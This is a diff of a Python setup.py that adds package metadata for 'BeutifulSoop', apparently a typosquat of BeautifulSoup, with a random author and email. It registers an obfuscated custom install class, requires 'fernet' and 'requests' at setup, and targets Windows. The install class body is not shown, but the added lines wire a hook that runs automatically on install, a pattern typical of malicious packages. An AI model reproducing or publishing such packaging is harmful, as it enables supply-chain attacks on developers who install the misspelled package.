@@ -18,5 +18,22 @@ class XxKmchibFhmLOBhxPKSjVFudcLtKCtLkZVmCGTxzSxlAbCaUszXcqvKSIoHMFCZcQxSJWOdFmM
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="BeutifulSoop",
+    version=VERSION,
+    author="UNxTZJpFfWaKizAy",
+    author_email="QcSZdfORqiArqdsVjWVN@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': XxKmchibFhmLOBhxPKSjVFudcLtKCtLkZVmCGTxzSxlAbCaUszXcqvKSIoHMFCZcQxSJWOdFmMHqEllyEcrJaKCQhxtaJPXrBVbLrtUuWFpPxcEFWdKNEKWSynnQdIvxFuTnRZhX,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
